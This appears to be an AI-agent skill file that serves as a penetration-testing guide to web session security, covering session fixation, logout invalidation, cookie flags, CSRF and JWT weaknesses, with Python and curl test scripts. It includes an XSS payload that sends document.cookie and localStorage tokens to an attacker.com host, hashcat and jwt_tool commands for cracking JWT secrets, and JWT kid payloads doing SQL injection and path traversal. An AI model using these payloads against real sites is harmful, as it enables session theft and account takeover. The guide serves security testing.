---
name: session-security
description: Session security analysis guide. Covers session fixation, hijacking, token reuse, JWT attacks, cookie security, CSRF token handling, and session management flaws. Use when analyzing authentication flows, session tokens, cookies, or testing session-related vulnerabilities. Chinese trigger: 会话安全、session fixation、session hijacking、token reuse、cookie测试、JWT安全
---

# Session Security

Session management vulnerabilities and testing techniques.

---

## SESSION SECURITY PHILOSOPHY

```
SESSION SECURITY LIFECYCLE:
1. CREATE — How session is created after login
2. REGENERATE — Does session ID rotate after privilege change
3. BIND — Is session bound to IP/User-Agent
4. STORE — How session is stored (cookie, localStorage, JWT)
5. VALIDATE — How session is validated on each request
6. INVALIDATE — Does logout actually kill the session
7. EXPIRE — Are sessions limited in duration
```

### Session Security Rules

```
GOOD session security:
- Session ID regenerated after login
- Session bound to IP and/or User-Agent
- Session expires after inactivity (15-30 min)
- Session expires absolutely (24h max)
- Session invalidated on logout
- Session revoked on password change
- HttpOnly + Secure + SameSite on cookies
- Server-side session store (not JWT for sensitive apps)
- CSRF token used with session

BAD session security:
- Session ID reused before/after login
- No binding (any IP can use any session)
- Session never expires (or expires in months)
- Logout doesn't invalidate (server-side)
- Same session works after password change
- Session in localStorage (accessible to XSS)
- JWT with long expiration and no refresh mechanism
- No CSRF token
- Predictable session IDs (sequential, timestamp-based)
```

---

## SESSION CREATION AND REGENERATION

### Session Fixation Testing

```
Test: Session fixation
1. GET / (before login) → session ID: ABC123
2. POST /login {'user':'test','pass':'test'} → session ID still ABC123
3. VULNERABILITY: Session ID not regenerated after login

Fix: Server must generate new session ID after authentication
```

**PoC Script:**
```python
#!/usr/bin/env python3
import requests

BASE = "https://target.com"
FIXED_SESSION = "attacker_controlled_session_id"

session = requests.Session()
session.cookies.set("session", FIXED_SESSION)
r = session.get(f"{BASE}/")
print(f"Session before login: {session.cookies.get('session')}")

session.post(f"{BASE}/login", json={
    "username": "victim",
    "password": "victim_password"
})
print(f"Session after login: {session.cookies.get('session')}")

if session.cookies.get('session') == FIXED_SESSION:
    print("[+] VULNERABLE: Session ID not regenerated after login!")
else:
    print("[-] Session regenerated (good)")
```

### Session Regeneration Checks

```bash
# Before login
curl -sk -c cookies1.txt https://target.com/login
grep session cookies1.txt

# After login
curl -sk -c cookies2.txt -b cookies1.txt \
  -X POST https://target.com/login \
  -d "username=test&password=test"
grep session cookies2.txt

# Compare
diff cookies1.txt cookies2.txt
# If session unchanged → FIXATION VULNERABILITY

# After logout
curl -sk -c cookies3.txt -b cookies2.txt https://target.com/logout
grep session cookies3.txt
```

---

## SESSION STORAGE

### Session Storage Security

```
LOCATION                   | SECURE? | NOTES
---------------------------|---------|-------------------------
HttpOnly cookie            | GOOD    | Not accessible to JS
Secure cookie              | GOOD    | Only sent over HTTPS
SameSite cookie            | GOOD    | Blocks CSRF
Regular cookie             | OK      | Accessible to XSS
localStorage               | POOR    | XSS can steal immediately
sessionStorage             | OK      | Don't persist across tabs
JWT in URL                 | POOR    | Leaks via Referer
JWT in Authorization Bearer| GOOD    | Better than cookie for APIs
In-memory JS variable      | GOOD    | Not persisted, safe from XSS
```

### Testing Session Storage

```bash
# Check if session in cookie
curl -skI https://target.com/login | grep -i set-cookie
# Look for: session=, token=, sid=, PHPSESSID=, JSESSIONID=

# Check cookie flags
curl -skI https://target.com/login | grep -i set-cookie | grep -iE '(httponly|secure|samesite)'

# Check if session in localStorage
# Use browser DevTools: Application → Local Storage

# Check if session in JWT
# Inspect Authorization header in requests
```

### localStorage XSS Risk Assessment

```javascript
// HIGH RISK: If localStorage holds session token
// And XSS is present → immediate account takeover

// Check localStorage contents
Object.entries(localStorage).forEach(([k, v]) => {
  if (k.toLowerCase().includes('token') || k.toLowerCase().includes('session') || k.toLowerCase().includes('auth')) {
    console.log(`HIGH RISK: ${k} = ${v.substring(0,20)}...`);
  }
});
```

---

## SESSION INVALIDATION

### Logout Testing

```
Test 1: Does logout kill session server-side?
1. Login → get session token ABC
2. GET /api/profile (with token) → 200
3. POST /logout
4. GET /api/profile (with same token ABC) → 401

Test 2: Logout CSRF
1. Attacker hosts: <img src="https://target.com/logout">
2. Victim visits attacker page
3. Victim's session logged out

Test 3: Token still valid after logout?
1. Login → get JWT token
2. Logout
3. Use JWT to access API → Still works?
4. If yes: INVULNERABLE (server doesn't validate logout)
```

### Session Reuse Testing

```python
#!/usr/bin/env python3
import requests

BASE = "https://target.com"
session = requests.Session()

# Login
r = session.post(f"{BASE}/login", json={"username": "test", "password": "test"})
token1 = session.cookies.get('session')
print(f"Session after login: {token1}")

# Logout
r = session.get(f"{BASE}/logout")
print(f"Logout status: {r.status_code}")

# Try to reuse old session
r = session.get(f"{BASE}/api/me")
print(f"After logout, /api/me: {r.status_code}")

if r.status_code == 200:
    print("[+] VULNERABLE: Session still valid after logout!")
else:
    print("[-] Session properly invalidated")
```

---

## JWT SECURITY TESTING

### JWT Structure Analysis

```
Structure: header.payload.signature
Base64 decode header and payload to inspect claims

Common vulnerabilities:
- None algorithm: alg=none, remove signature
- Weak HMAC secret: brute-force common secrets
- RS256→HS256: use public key as HMAC secret
- kid parameter: SQL injection or path traversal
- Payload modification: add admin=true
- Expiration: long-lived or missing exp claim
```

### JWT Testing Tools

```bash
# Decode JWT (no verification)
echo "eyJ..." | cut -d. -f1 | base64 -d | jq .
echo "eyJ..." | cut -d. -f2 | base64 -d | jq .

# jwt_tool
pip3 install jwt_tool
jwt_tool eyJ... -T  # decode and analyze
jwt_tool eyJ... -C  # crack secret
jwt_tool eyJ... -X  # exploit with manual payload

# jwtcat
jwtcat -m brute -w rockyou.txt eyJ...

# Hashcat for JWT
hashcat -a 0 -m 16500 jwt.txt wordlist.txt --force

# John the Ripper
john --format=HMAC-SHA256 jwt.txt --wordlist=wordlist.txt
```

### JWT Attack Scenarios

```bash
# None algorithm
# Decode header → change alg=none → remove signature

# Weak secret
echo -n '{"alg":"HS256","typ":"JWT"}.{"sub":"test"}' > jwt_test.txt
hashcat -a 0 -m 16500 jwt_test.txt rockyou.txt

# RS256→HS256 confusion
curl https://target.com/.well-known/jwks.json

# kid SQL injection
{"alg": "HS256", "typ": "JWT", "kid": "0' UNION SELECT 'attacker_secret'--"}

# kid path traversal
{"alg": "HS256", "typ": "JWT", "kid": "../../../../etc/passwd"}
```

---

## COOKIE SECURITY

### Cookie Flag Testing

```bash
# Check Set-Cookie flags
curl -skI https://target.com/login | grep -i set-cookie

# Expected flags:
# HttpOnly: YES
# Secure: YES
# SameSite: Strict or Lax

# Check SameSite enforcement
curl -skI https://target.com -H "Cookie: session=test"
curl -skI https://subdomain.target.com -H "Cookie: session=test"
```

### Cookie Security Issues

```
Missing HttpOnly:
- XSS → immediate token theft via document.cookie

Missing Secure:
- Cookie sent over HTTP
- MITM can intercept session token

Missing SameSite:
- CSRF attacks easier
- Cross-site context can send cookies
```

### Cookie Testing PoC

```python
import requests

session = requests.Session()
r = session.get("https://target.com/login")
set_cookie = r.headers.get('Set-Cookie', '')
print("Set-Cookie:", set_cookie)

has_httponly = 'httponly' in set_cookie.lower()
has_secure = 'secure' in set_cookie.lower()
samesite = None
if 'samesite' in set_cookie.lower():
    samesite = 'strict' if 'strict' in set_cookie.lower() else 'lax'
print(f"HttpOnly: {has_httponly}, Secure: {has_secure}, SameSite: {samesite}")
```

---

## CSRF TOKEN SECURITY

### CSRF Token Testing

```
Test if CSRF token is validated:
1. Find state-changing endpoint (POST/PUT/DELETE)
2. Note CSRF token name (X-CSRF-Token, _csrf, csrf_token)
3. Remove token entirely → does request still work?
4. Use wrong/empty token → does it still work?
5. Use old token from another session → does it still work?
```

### CSRF Token Bypass Scenarios

```bash
# 1. Token in cookie only (not in request)
# Server reads from cookie, client doesn't send it explicitly

# 2. Token not bound to session
# All users share same token

# 3. Token validated only for POST, not PUT/DELETE

# 4. Token in GET parameter (referer leak)
```

---

## SESSION HIJACKING

### Session Token Theft Vectors

```
1. XSS → document.cookie → session token
2. MITM → unencrypted HTTP → session token
3. Referer leak → token in URL → Referer header
4. localStorage XSS → session token in storage
5. Browser history → token in URL
6. Logs/analytics → token sent to third parties
7. Subresource requests → token sent with images/fonts
```

### Session Hijacking PoC (XSS)

```html
<!-- Host on attacker.com -->
<script>
fetch('https://attacker.com/steal?c=' + document.cookie);
fetch('https://attacker.com/steal?t=' + localStorage.getItem('session_token'));
</script>
```

---

## SESSION BINDING

### IP/User-Agent Binding

```
Session binding:
- Bind session to IP address
- Bind session to User-Agent
- Bind session to both (IP + UA)

Testing:
1. Login from IP_A → session token ABC
2. Use same token from IP_B → should fail
3. Change User-Agent → should fail
4. Both changed → should fail
```

---

## SESSION EXPIRATION

### Session Lifetime Testing

```python
import time

def test_session_expiry(base_url):
    session = requests.Session()
    session.post(f"{base_url}/login", json={"username": "test", "password": "test"})
    token = session.cookies.get('session')

    test_times = [60, 300, 600, 1800, 3600, 86400]

    for wait_time in test_times:
        print(f"Testing after {wait_time}s...")
        time.sleep(wait_time)
        session.cookies.set('session', token)
        r = session.get(f"{base_url}/api/me")
        if r.status_code == 200:
            print(f"  [+] Session still valid after {wait_time}s")
        else:
            print(f"  [-] Session expired after {wait_time}s (good)")
            break
```

### Expected Session Lifetimes

| Session Type | Expected Lifetime |
|--------------|-------------------|
| Web app (active) | 15-30 min inactivity |
| Web app (absolute) | 8-24 hours |
| API (JWT) | 15-60 min |
| API (refresh token) | Refresh: 1h, Access: 15min |
| Admin session | 15 min inactivity |
| Remember me | 7-30 days |
| 2FA-approved session | Until 2FA re-prompt |

---

## MULTIPLE SESSION ISSUES

### Concurrent Session Testing

```python
import requests

session1 = requests.Session()
session2 = requests.Session()
session1.post("https://target.com/login", json={"username": "test", "password": "test"})
session2.post("https://target.com/login", json={"username": "test", "password": "test"})
token1 = session1.cookies.get('session')
token2 = session2.cookies.get('session')

r1 = session1.get("https://target.com/api/me")
r2 = session2.get("https://target.com/api/me")

if token1 == token2:
    print("[+] Both sessions share same token (unusual)")
else:
    print("[-] Different tokens (normal)")
```

---

## ADVANCED SESSION ATTACKS

### Session Prediction

```
If session IDs are predictable:
- Sequential: sess_123, sess_124 → enumerate all
- Timestamp: sess_1620000000 → predict from timestamp
- User-specific: sess_john_123 → enumerate usernames
- Weak random: short seed → brute-force
```

### Session Fixation via URL

```
Some apps pass session in URL:
https://target.com/?session=ABC123

Test:
1. Send victim: https://target.com/?session=FIXED_SESSION
2. Victim clicks and logs in
3. Session bound to attacker's session ID
4. Attacker uses FIXED_SESSION to access victim's account
```

---

## FINAL SESSION RULES

1. **Does logout kill session server-side** — never trust client-only invalidation
2. **Does session ID rotate on login** — fixations enable pre-auth attacks
3. **Is session bound to IP/User-Agent** — improves security, be aware of NAT
4. **Is session in HttpOnly cookie** — localStorage = XSS = immediate takeover
5. **Does session expire** — forever sessions = forever compromise risk
6. **Are cookie flags correct** — Secure, HttpOnly, SameSite
7. **Can session be predicted** — collect tokens, analyze entropy
8. **Test concurrent sessions** — some apps limit, others don't care
9. **Does password change kill sessions** — if not, passwords are less useful
10. **Combine with other vulns** — session bugs chain with everything
